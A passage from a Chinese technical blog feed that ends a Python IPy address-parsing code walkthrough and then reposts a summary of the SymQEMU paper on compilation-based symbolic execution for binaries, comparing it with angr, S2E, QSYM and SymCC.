<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>]<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span> <span class="hljs-keyword">or</span> x &lt; <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: single byte must be 0 &lt;= byte &lt; 256&quot;</span> % (ipstr))<br>        <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">bytes</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) + (<span class="hljs-built_in">bytes</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) + (<span class="hljs-built_in">bytes</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">bytes</span>[<span class="hljs-number">3</span>], <span class="hljs-number">4</span>)<br><br>    <span class="hljs-keyword">elif</span> intval <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># we try to interprete it as a decimal digit -</span><br>        <span class="hljs-comment"># this ony works for numbers &gt; 255 ... others</span><br>        <span class="hljs-comment"># will be interpreted as IPv4 first byte</span><br>        <span class="hljs-keyword">if</span> intval &gt; MAX_IPV6_ADDRESS:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;IP Address can&#x27;t be larger than %x: %x&quot;</span> % (MAX_IPV6_ADDRESS, intval))<br>        <span class="hljs-keyword">if</span> intval &lt;= MAX_IPV4_ADDRESS <span class="hljs-keyword">and</span> ipversion != <span class="hljs-number">6</span>:<br>            <span class="hljs-keyword">return</span> (intval, <span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> (intval, <span class="hljs-number">6</span>)<br><br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;IP Address format was invalid: %s&quot;</span> % ipstr)<br></code></pre></td></tr></table></figure><p>分解IPv6地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_parseAddressIPv6</span>(<span class="hljs-params">ipstr</span>):<br><br>    items = []<br>    index = <span class="hljs-number">0</span><br>    fill_pos = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">while</span> index &lt; <span class="hljs-built_in">len</span>(ipstr):<br>        text = ipstr[index:]<br>        <span class="hljs-keyword">if</span> text.startswith(<span class="hljs-string">&quot;::&quot;</span>):<br>            <span class="hljs-keyword">if</span> fill_pos <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-comment"># Invalid IPv6, eg. &#x27;1::2::&#x27;</span><br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: Invalid IPv6 address: more than one &#x27;::&#x27;&quot;</span> % ipstr)<br>            fill_pos = <span class="hljs-built_in">len</span>(items)<br>            index += <span class="hljs-number">2</span><br>            <span class="hljs-keyword">continue</span><br>        pos = text.find(<span class="hljs-string">&#x27;:&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pos == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># Invalid IPv6, eg. &#x27;1::2:&#x27;</span><br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: Invalid IPv6 address&quot;</span> % ipstr)<br>        <span class="hljs-keyword">if</span> pos != -<span class="hljs-number">1</span>:<br>            items.append(text[:pos])<br>            <span class="hljs-keyword">if</span> text[pos:pos+<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;::&quot;</span>:<br>                index += pos<br>            <span class="hljs-keyword">else</span>:<br>                index += pos+<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> index == <span class="hljs-built_in">len</span>(ipstr):<br>                <span class="hljs-comment"># Invalid IPv6, eg. &#x27;1::2:&#x27;</span><br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: Invalid IPv6 address&quot;</span> % ipstr)<br>        <span class="hljs-keyword">else</span>:<br>            items.append(text)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> items <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> items[-<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment"># IPv6 ending with IPv4 like &#x27;::ffff:192.168.0.1&#x27;</span><br>        <span class="hljs-keyword">if</span> (fill_pos <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> (fill_pos &lt;= <span class="hljs-built_in">len</span>(items)-<span class="hljs-number">1</span>):<br>            <span class="hljs-comment"># Invalid IPv6: &#x27;ffff:192.168.0.1::&#x27;</span><br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: Invalid IPv6 address: &#x27;::&#x27; after IPv4&quot;</span> % ipstr)<br>        value = parseAddress(items[-<span class="hljs-number">1</span>])[<span class="hljs-number">0</span>]<br>        items = items[:-<span class="hljs-number">1</span>] + [<span class="hljs-string">&quot;%04x&quot;</span> % (value &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-string">&quot;%04x&quot;</span> % (value &amp; <span class="hljs-number">0xffff</span>)]<br><br>    <span class="hljs-comment"># Expand fill_pos to fill with &#x27;0&#x27;</span><br>    <span class="hljs-comment"># [&#x27;1&#x27;,&#x27;2&#x27;] with fill_pos=1 =&gt; [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;2&#x27;]</span><br>    <span class="hljs-keyword">if</span> fill_pos <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        diff = <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(items)<br>        <span class="hljs-keyword">if</span> diff &lt;= <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: Invalid IPv6 address: &#x27;::&#x27; is not needed&quot;</span> % ipstr)<br>        items = items[:fill_pos] + [<span class="hljs-string">&#x27;0&#x27;</span>]*diff + items[fill_pos:]<br><br>    <span class="hljs-comment"># Here we have a list of 8 strings</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(items) != <span class="hljs-number">8</span>:<br>        <span class="hljs-comment"># Invalid IPv6, eg. &#x27;1:2:3&#x27;</span><br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: Invalid IPv6 address: should have 8 hextets&quot;</span> % ipstr)<br><br>    <span class="hljs-comment"># Convert strings to long integer</span><br>    value = <span class="hljs-number">0</span><br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">try</span>:<br>            item = <span class="hljs-built_in">int</span>(item, <span class="hljs-number">16</span>)<br>            error = <span class="hljs-keyword">not</span>(<span class="hljs-number">0</span> &lt;= item &lt;= <span class="hljs-number">0xffff</span>)<br>        <span class="hljs-keyword">except</span> ValueError:<br>            error = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">if</span> error:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%r: Invalid IPv6 address: invalid hexlet %r&quot;</span> % (ipstr, item))<br>        value = (value &lt;&lt; <span class="hljs-number">16</span>) + item<br>        index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> value<br></code></pre></td></tr></table></figure><p>通过分割移位的方式转换输入为IP</p><h1 id="参考链接">参考链接</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>RFC 791; RFC 4632<a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>RFC 2373<a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3"class="footnote-text"><span><a href="https://pypi.org/project/IPy/#description"class="uri">https://pypi.org/project/IPy/#description</a><a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:4"class="footnote-text"><span><a href="https://github.com/autocracy/python-ipy"class="uri">https://github.com/autocracy/python-ipy</a><a href="#fnref:4" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Software Development</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ipy</tag>
      
      <tag>python</tag>
      
      <tag>Network Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】带你搞懂符号执行的前世今生与最近技术</title>
    <link href="/2021/02/23/recent-technology-of-symbolic-execution/"/>
    <url>/2021/02/23/recent-technology-of-symbolic-execution/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文由iddm原创发布<br />转载自 <a href="https://www.anquanke.com/post/id/231413"class="uri">https://www.anquanke.com/post/id/231413</a></p></blockquote><p>iddm带你读论文——SymQEMU:Compilation-based symbolic execution forbinaries</p><p>本篇文章收录于2021年网络安全顶会NDSS，介绍了最新的符号执行技术，并且清晰地比较了当前流行的各种符号执行的引擎的优劣势，可以比较系统的了解符号执行技术的相关知识</p><blockquote><p>title = {{SymQEMU}: Compilation-based symbolic executionfor binaries},<br />author = {Poeplau, Sebastian and Francillon, AurÃ©lien}, booktitle ={Network and Distributed System Security Symposium}, year = 2021,organization = {Network &amp; Distributed System Security Symposium},month = {February}, affiliations = {Eurecom, Code Intelligence},extralink = {Details: tools/symbolic_execution/symqemu.html}download_address = <ahref="https://www.ndss-symposium.org/wp-content/uploads/2021-118-paper.pdf"class="uri">https://www.ndss-symposium.org/wp-content/uploads/2021-118-paper.pdf</a></p></blockquote><h2 id="摘要">摘要</h2><p>符号执行技术是针对软件分析和bug检测的强力技术，基于编译的符号执行技术是最近提出的一种方法，当对象源代码可以得到时可以提升符号执行的性能。本文提出了一种新的基于编译的，针对二进制文件的符号执行技术。此系统名为symqemu，在qemu基础之上开发，在将target程序转换为host架构的机器码之前修改其IR，这使得symqemu能够将编译符号执行引擎的能力应用于二进制文件，并且在维持架构独立性的同时能够获得性能上的提升。</p><p>本文提出了这个方法以及其实现，我们利用统计学方法证明了他比最先进的符号执行引擎s2e以及qsym，在某些benchmarks上，他甚至由于针对源码带分析的symcc。并且利用symqemu在经过多重测试的library上发现了一个位置漏洞，证明了他在实际软件中的可用性。</p><h2 id="介绍">介绍</h2><p>符号执行技术近年来大力发展，一种有效但是代价大的技术，其经常与fuzzing技术混合，并成为混合fuzzing，fuzzing用来探索容易到达的路径，而符号执行用来探索不易到达的路径。</p><p>针对符号执行技术的重要特征之一就是其是否需要提供源代码进行分析，而真实世界中的大多数程序(由于某些原因)是不提供源代码的。</p><p>所以binary-only的符号执行技术被迫切需要，但是面临一个两难的困境，到底是选择性能的提升还是架构的独立性呢？比如，QSYM针对binary有很高的性能，但是其仅限于x86处理器的指令集。它不仅仅造成了系统架构依赖性，并且由于现在处理器指令的庞大提升了其复杂性。SE则是可以被广泛的应用但是性能较差，S2E可以分析多架构代码以及内核代码。然而他这么做的代价是针对target程序的多种翻译的最终表示，导致了复杂性升高以及影响性能。</p><p>在本文中，我们提出了一个方法（a）独立于被测试的程序的target架构（b）实现复杂度低（c）具有高性能。symqemu的关键是qemu的cpu仿真可以同于轻量级的符号执行机制：不是像s2e中使用中的那种计算复杂度高的将target程序向IR的转换方式，我们hookqemu中的二进制转换机制为了将符号处理直接编译到机器码中。这样使得在性能优于最先进符号执行系统的同时可以保持加够独立性。目前，我们针对于linux用户程序(ELFbinaries)，但我们可以将其拓展到任何qemu支持的架构中取，同时我们将symqemu开源来加速未来相关领域的研究。</p><p>将符号处理编译到target程序中同样是symcc的核心工作，其性能优于其他符号执行引擎，但是symcc只针对于有源码的程序。symqemu性能优于se2以及qsym，并且相比于基于源代码的symcc性能来说，某些情况也是可以比较。</p><p>本文工作主要有以下贡献：</p><ol type="1"><li>分析了当前最先进的binary-only的符号执行引擎并且明确了其设计中的优势和劣势。</li><li>提出了一个方法，融合了其他工具的优势，避免了其他工具的缺点，核心idea是应用基于编译的符号执行技术到binary上，我们工具的源代码开源。</li><li>进行了详细的评价试验，并且实验数据以及实验脚本开源。</li></ol><h2 id="背景">背景</h2><h3 id="符号执行">符号执行</h3><p>符号执行的目的是在目标程序的执行过程中跟踪中间值是如何计算的，每一个中间值都可以表示为程序输入的一个公式。在任何点，系统都会使用这个公式查看这个点是否可达，这个指针是否为空等。如果答案是确定的，那么符号执行引擎将会提供测试用例，一个新的输入例子来触发对应的行为。所以符号执行可以被方便的用来探测程序路径以及触发bug。</p><p>为了跟踪程序的计算过程，符号执行系统必须对程序指令集有一个深入的理解，许多实现都是通过将程序翻译为IR，比如LLVM和VEX。IR随后被符号化执行，因为执行器只需要处理IR(通常由少量的指令集构成)，所以实现相对比较简单。<strong>并且在之前的工作中我们发现，在对进行测试的程序的高级表示的查询较低级指令的表示的查询更加容易解决。</strong></p><p>然而将程序转换为IR需要计算能力并且对程序执行过程引入了开销；然而一些实现过程放弃了翻译而直接工作在机器代码上，这种解决方案除了性能上的优势，同时在执行器无法怎样解释指令时，会帮助提升鲁棒性。然而在另一方面，这种解决方案会导致执行器被限制在了一种特定的架构之中。另一种基于源码的执行器在实际中并不是那么广泛使用，因为大多数情况下只能得到二进制文件。</p><h3 id="binary-only符号执行">binary-only符号执行</h3><p>仅仅针对二进制文件的符号执行添加了许多挑战：缺少源代码，将程序翻译为IR需要可靠的反汇编器；由于静态反汇编的挑战，大多数实现都是在运行态按需进行反汇编。当源码不可得时，针对架构的支持同样也是重要的，此时交叉编译不可行。尤其针对嵌入式设备来说，缺少对多架构的支持是不可行的。</p><p>无需翻译的执行器除了面对复杂实现带来的可维护问题外，还面临可移植性问题。将程序翻译为中间语言的执行器需要可靠的反汇编器，已经有大量的工作来确定翻译器的准确性。基于源码的执行器可以较容易的获得IR。</p><p>基于二进制文件的符号执行对于高性能以及多架构支持具有更迫切的需求。</p><h3 id="最先进解决方案">最先进解决方案</h3><p>下面描述最先进的符号执行实验方案以及他们各自对应解决的问题。</p><h4 id="angr">angr</h4><p><img lazyload src="/img/loading.gif" data-src="https://p5.ssl.qhimg.com/t01d8ae11bba34bbc23.png" /></p><p>一个经典的符号执行翻译器，使用VEX，Valgrind框架的翻译器和IR。目标程序在运行时被翻译。其中一个优化，angr可以在Unicorn，基于qemu的快速CPU模拟器，上执行不涉及符号数据的计算。</p><p>由于基于VEX，agnr固然可以支持所有VEX能够处理的架构，因为angr核心由python语言实现，所以他速度慢但是很通用。</p><h4 id="s2e">s2e</h4><p><img lazyload src="/img/loading.gif" data-src="https://p1.ssl.qhimg.com/t01a2571a335356fca7.png" /></p><p>由于想要将基于源代码符号执行覆盖范围拓展到目标程序依赖以及操作系统内核，创造了s2e。为了实现这个目的，s2e在qemu仿真器内执行整个操作系统并且将其与KLEE链接为了符号化执行相关代码。</p><p>这个系统相当复杂，包括被测试程序的多重翻译：</p><ol type="1"><li>QEMU是一个二进制文件翻译器，比如在通常操作中，他讲目标程序从机器代码翻译为一种中间表示即TCGops，然后将其重新编译为针对host CPU的机器码。</li><li>当执行是设计符号化数据时，S2E使用的修改过的QEEMU不再将TCGops重编译为机器代码，他将其翻译为LLVMbitcode，随后将其传递给KLEE。</li><li>KLEE符号化解释执行LLVMbitcode，然后将结果的具体情况回传给QEMU。</li></ol><p>此系统可以很灵活的处理不同处理器架构，并且可以支持针对操作系统全层面的计算跟踪。然而他需要付出一下代价：S2E是一个具有庞大代码基础的复杂系统。并且两部分翻译，从机器码翻译为TCGops和从TCG ops翻译为LLVMbitcode损害了他的性能。与angr针对用户态程序来比较，S2E需要更多的设计建立以及运行，但是提供了一个更加全面的分析。</p><h4 id="qsym">QSYM</h4><p><img lazyload src="/img/loading.gif" data-src="https://p0.ssl.qhimg.com/t01accb1b6c09f290ad.png" /></p><p>QSYM在性能上有极大的增强，他不将目标程序翻译为中间语言。他在运行态时向x86机器码内进行插桩来向二进制文件内添加符号追踪。具体来讲，他应用了InterPin，一种动态二进制插桩框架，来向目标程序内插入hook代码。在hook内部，他和程序运行的实际代码等价的运行符号代码。</p><p>这种方式产生了一种针对x86程序的非常快速并且鲁棒性很强的符号执行引擎。然而，这个系统固然会被限制在x86框架内，并且实现是繁琐的，因为他需要处理在计算中可能出现的任何指令。并且将其迁移到其他架构将会有很大的困难。</p><h3 id="symcc">symcc</h3><p><img lazyload src="/img/loading.gif" data-src="https://p4.ssl.qhimg.com/t0126c64635b3ce1f7c.png" /></p><p>最近提出的符号执行工具，SYMCC，同样是本文作者之前的工作，基于源代码的，不支持分析二进制文件。SYMQEMU的灵感来自于SYMCC，所以简要概括一下他的设计。</p><p>我们在设计SYMCC时观察到，目前大多数符号执行系统是解释器。然而我们却提出一个基于编译的方法，并且展示了他能够提升执行性能以及系统实际探索能力。SYMCC在编译器内进行hook，并且在target代码内进行插装，并且注入实施支持库的调用。因此符号执行成为了被编译文件的一部分。并且分析代码可以进行优化，并且插装代码并不会在每次执行时进行重复。</p><p>SYMCC基于编译的方式需要编译器，所以他只能在被测试程序源代码可用时发挥作用。尽管如此，我们认为这个方式是足够有前途，所以一直寻找一种方式将其应用到binary-only的方面之中，本文的主要工作就是说明基于编译的符号执行系统是如何在二进制文件上高效的工作。</p><h2 id="symqemu">SYMQEMU</h2><p>现在提出针对binry-only设计实现的SYMQEMU。他的灵感来自于之前的工作并结合了如今最先进的符号执行系统的技术。</p><h3 id="design">design</h3><p>系统两个主要目标：</p><ol type="1"><li>实现高效能，以致于实际软件。</li><li>合理的架构独立性，比如将其迁移到新的处理器架构不需要做过多工作。</li></ol><p>基于之前的调查，我们发现流行的最先进的符号执行系统实现了如下两个目标中的一个，但并非全部：angr和s2e是架构灵活的但是性能差；QSYM在性能上比较高但是其只针对x86架构。</p><p>如今针对架构独立的解决方案是将被测程序翻译为IR，这样如果想要支持一个新的架构，只有翻译器需要移植，理想情况下，我们选择一种中间语言，其已经存在支持多种架构的相关翻译器。以中间语言灵活地表示程序是一种著名的，已经成功的应用于许多其他领域的技术，比如编译器设计以及静态代码分析。我们也将这种技术合并到我们的设计中来。</p><p>当将程序翻译为中间语言获得便利的同时，我们同样需要了解这种方式对于性能的影响：将binary-only程序静态翻译是具有挑战性的，因为反汇编器可能是不可靠的，尤其是存在间接跳转的情况下，并且在分析过程中运行时进行翻译会提升功耗。我们认为这是s2e性能劣于QSYM的主要原因。我们的目标就是找到一种翻译系统同时保持性能优越。</p><p>首先，我们主要到s2e以及angr都收到了非重要问题的影响，并且这些问题都是可以通过工程方面的工作解决的：</p><ol type="1"><li>S2E将被测试程序翻译了两次，然而如果符号执行过程是在第一次中间表示上实现的话，第二次翻译过程其实是可以避免的。</li><li>angr的性能受到python实现影响，将其核心代码移植到一种更快速的语言中会显著提升速度。</li></ol><p>然而我们的贡献并不仅仅是找出并且避免上述两个问题，我们还观测到：s2e以及angr，以及其他所有的binaty-only的符号执行器，都解释执行被测试程序的中间表示，解释是设计的核心部分。我们推测，将目标程序编译为插桩版本将会带来很高的性能上的提升。虽然SYMCC是基于源代码的，基于编译的符合执行引擎，但是他证明了这一点。</p><p>收到上述观测到的启发，我们的设计方法如下：</p><ol type="1"><li>在运行态将目标程序翻译为IR。</li><li>为符号执行所需的IR插桩。</li><li>将IR编译为适合CPU运行分析的机器码并且直接执行。</li></ol><p>通过将插桩的目标程序编译为机器码，补偿了在第一阶段将二进制文件翻译为中间代码时的性能损失。CPU执行机器码比解释器运行IR速度快得多，因此我们获得了一个可以与没有翻译的系统的性能相当的系统，同时由于进行了程序翻译可以保持架构的独立性。</p><h3 id="implementation">implementation</h3><p><img lazyload src="/img/loading.gif" data-src="https://p2.ssl.qhimg.com/t01a1270b954219c6a0.png" />我们在qemu的基础之上实现了SYMQEMU，选择qemu的原因是因为他是一个鲁棒性的系统仿真器，并且可以支持许多架构，在他的基础之上进行实现，我们可以实现架构独立性。并且qemu还有另一个特点正好满足我们的需求，他不仅将二进制文件翻译为针对处理器独立的IR，他同时支持将中间语言便已成为hostCPU的机器码。qemu的主要优点是他能够将二进制文件翻译为不同host架构的机器代码，并且可以完成全系统仿真，方便于之后拓展支持交叉架构的固件分析。</p><p><img lazyload src="/img/loading.gif" data-src="https://p3.ssl.qhimg.com/t01ecaf26a14a03318d.png" /></p><p>具体来说，我们拓展了QEMU的组件TCG。在未被修改的qemu中，TCG负责将guest架构的机器码块翻译为架构独立的语言，叫做TCGops，然后编译这些TCGops为host架构的机器码。由于性能原因，这些翻译好的blocks随后被缓存，所以翻译在每次执行过程中只需要进行一次。SYMQEMU在这过程中插入了一步：当被测程序翻译为TCGops时，我们不仅插桩来模拟guest CPU而且产生一些额外的TCGops来建立对应的符号约束表达式。针对建立符号表达式以及求解这些的支持库，symqemu重用SYMCC的支持库，即重用QSYM的。</p><p>（此处有详细例子，感兴趣去读原文）</p><p>目前我们使用的qemulinux用户模式的仿真，即我们只模拟了普通用户空间的guest系统。系统调用被转换来满足host架构的要求，这些是针对host的内核来工作的，使用了qemu常规的机制。因此我们的符号执行分析在系统调用处停止，与QSYM以及angr类似。与全系统仿真(比如s2e)来讲，这样节省了为每个target架构准备系统镜像的方面，并且提升了性能，因为是直接运行kernel代码而不是通过仿真。但是如果需要的话，SYMQEMU是很容易的被拓展为QEMU的全系统仿真。</p><h3 id="架构独立">架构独立</h3><p>首先要明确，执行分析的主机的架构叫做host，被测代码在其架构之上被编译的叫做guest。尤其是在嵌入式设备分析中，host与guest架构不同是显然的，嵌入式设备的系统进行符号执行分析的能力不足，所以将固件放置到其他系统中进行分析，SYMQEMU就是为这种情况准备的，能够在多架构下运行。</p><p>SYMQEMU利用qemu TCGtranslators，涵盖多种处理器类型，并且我们针对其修改几乎独立于target架构。</p><p>也就是说，SYMQEMU可以在相关的host架构上运行并且可以支持所有qemu能够处理的guest架构下的二进制文件的分析。</p><h3 id="与之前的设计比较">与之前的设计比较</h3><p><img lazyload src="/img/loading.gif" data-src="https://p5.ssl.qhimg.com/t01c318c865cc6b5c1c.png" /></p><p>本节之处SYMQEMU与最先进的符号执行系统的不同之处。</p><p>与angr和s2e相似，SYMQEMU使用传统的，以IR来完成符号执行处理，显著的降低了实现的复杂性。但是不同于此二者的是，他是基于编译的符号执行技术，显著的提升了性能。</p><p>与QSYM比较，SYMQEMU设计最重要的优势是架构灵活性的同时，能够维持很高的执行速度。在qemu之上进行设计使其能够或者很多的数量的模拟器支持的架构处理能力。</p><p>SYMCC虽然不能够分析二进制代码，但是其给SYMQEMU提供了基于编译的思路。此二者都是通过修改其IR来在目标程序中插入符号处理，并且都是将结果直接编译为能够高效运行的机器码。然而SYMCC是面向源代码的，而SYMQEMU解决了分析二进制文件的不同指令集的挑战，SYMQEMU在翻译过程中的TCGops中插桩，SYMCC在编程过程中的LLVMbitcode内插桩。并且SYMQEMU解决了guest和target架构不匹配的问题。</p><p>我们认为本文工作结合了s2e以及angr的优势，即多架构支持，同时结合了symcc的优点，高性能，摒弃了他们的缺点；并且我们找到了一种方式，能够将SYMCC的核心idea应用到二进制文件的分析之中。</p><h3 id="内存管理">内存管理</h3><p>当symqemu分析软件时，他会建立很多符号公式来描述中间结果和路径约束。他们占用的内存会随着时间而一直增长，所以symqemu需要一种方式来清除那些不再被使用的公式。</p><p>首先我们讨论一下为什么内存管理是第一位的。IR在任何合理的程序中或对程序流有影响，或者成为最终结果的一部分；在前者情况下，对应的表达式被添加到路径约束的集合中，并且不能被清楚；但是针对后者情况，表达式成为最终结果的描述中的字表达式。所以符号表达式是什么时候变成不重要的呢？关键就是程序的输出是程序结果的一部分，但是他可能在程序的结束之前就已经产生了。</p><p>所以我们应该在符号在最后一次使用之后将其清除。QSYM使用的C++ smartpoints来实现了这个目的，但是我们在被修改的qemu中不能简单的相同的办法：TCG是一个动态翻译器，由于性能因素，它不产生任何被翻译代码的拓展分析。这使得高效的确定插入清除代码的位置非常困难。并且经验告诉我们，大多数程序中包含很少的，在程序执行过程之中无用的，相关符号数据和表达式，所以我们不想我们的清除机制造成很大的功耗。</p><p>我们使用了一种乐观的清除机制，在一种expression garbagecollector的基础之上：SYMQEMU跟踪所有从后端获得的符号表达式，如果他们的数目非常大时进行回收。最主要的观测是所有live表达式可以通过扫描如下发现</p><ol type="1"><li>模拟的CPU符号寄存器</li><li>存储对应符号内存结果的符号表达式的，内存中的shadow regions</li></ol><p>以上两种，后端都是可感知的。在感知到所有live表达式之后，symqemu将其与所有已经创建的符号表达式进行比较，并且释放那些不再使用的表达式。尤其是当一个程序在寄存器和内存中移除了计算的结果，对应的符号表达式同样被认为不再使用也被移除。我们将expression garbage collector 和QSYM’s smart pointer based memorymanagement相联系，这两种基础都认为表达式不再使用之后可以被释放。</p><h3 id="修改tcg-ops">修改TCG ops</h3><p>我们的方法要求能够像TCGops中插桩。然而TCG不支持在翻译过程之中的拓展修改功能，作为一个翻译器，他高度关注速度问题。因为，对于TCGops的程序化修改的工作很少。然而LLVM提供了丰富的API，支持compiler检查和修改LLVMbitcode。TCGops单纯的将指令存储在一个平面链表中，而没有任何高层次的类似于基本快的数据结构。并且程序流被期望与翻译块呈线性关系。</p><p>为了不和TCG产生不一致，我们的实现对每一个指令生成时进行符号处理。虽然这种方法可以避免与TCG优化以及代码生成器产生的问题，但是使得静态优化技术不可行，因为我们每次仅仅关注一条指令。尤其是我们无法静态确定给定的值是否是实际值，并且如果所有的操作都是符号值的情况下，我们也不能产生跳过符号计算的阶段的跳转。</p><p>因此我们最终于TCG所需要的运行环境的限制条件达成了妥协，同时允许我们有相关很高的执行速度：我们在支持的调用库中进行实际值性检查，这样，如果实际计算的输入都是准确值的话，就可以直接跳过符号值计算，但是这样会导致额外的库调用开销。</p><h3 id="shadow-call-stack">shadow call stack</h3><p>QSYM引入了上下文敏感的基本快剪枝，如果在同样的调用堆栈环境中频繁调用确定的计算会导致压抑符号执行(基于如下直觉，在同样的上下文环境中重复的执行分析并不会导致新的发现)。为了实现这个优化，符号执行需要维护一个shadowcall stack，记录跟踪call以及return指令。</p><p>在qemu基础之上，我们面临一个新的挑战，TCGops是一个非常低级别的target程序的中间表示。尤其是，call以及return指令不是被表示为单独的指令而是被翻译为一系列TCGops。比如一个在x86架构下的程序调用会生成TCGops，其将返回地址push到模拟的stack上，调整guest的stackpointer，并且根据被调用函数来修改guest的指令。这使得仅仅通过检测TCGops来以一个可靠并且架构独立的方式来识别call以及return是不可能的。我们选择了如下优化来提高鲁棒性：在架构独立的，能够将机器代码转换为TCGops的qemu代码中，每当遇到call和return时，我们会通知代码生成器。缺点就是针对每个target架构，类似的通知代码都必须被插入到翻译代码中去，但这并不复杂。</p><h2 id="评价">评价</h2><p>详见原文，主要是一些指标与测试效果</p><h2 id="未来工作">未来工作</h2><h3 id="全系统仿真">全系统仿真</h3><p>SYMQEMU目前运行符号执行针对linux用户态二进制程序，之后将会对其拓展到全系统分析，尤其是针对嵌入式设备而言，分析此类程序要求全系统仿真。</p><p>我们认为在SYMQEMU实现这一改进是可能的。将target翻译为TCGops，对其插桩，并将其编译为机器码，这些基本过程不改变。需要添加的一个机制是将符号化数据引入到guest系统中，这是受到S2Efake-instruction技术的启发，以及当在guest内存以及符号表达式之间存在映射时，shadow-memory系统需要记录虚拟MMU的数量。最终将会产生一个不仅可以对用户态程序进行测试，同样可以对内核代码进行测试的系统，并且其同样可分析非linux系统的代码以及裸固件等。</p><h3 id="caching-across-executions">caching across 